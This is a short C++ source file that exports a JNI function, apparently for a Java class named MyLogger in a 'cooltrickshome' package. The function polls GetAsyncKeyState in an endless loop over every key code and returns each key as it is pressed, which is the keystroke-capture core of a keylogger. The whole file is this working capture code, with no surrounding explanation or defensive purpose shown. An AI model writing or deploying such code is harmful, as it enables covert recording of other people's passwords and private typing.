#include <iostream>
#include <windows.h>
#include <fstream>
#include <jni.h> 
#include "MyLogger.h" 

JNIEXPORT jint JNICALL Java_cooltrickshome_MyLogger_GetKey(JNIEnv *, jclass){ 
  while(true){
        for(int c=8;c<=222;c++){
         if(GetAsyncKeyState(c)==-32767)
            return c;   
        }         
     }
} 
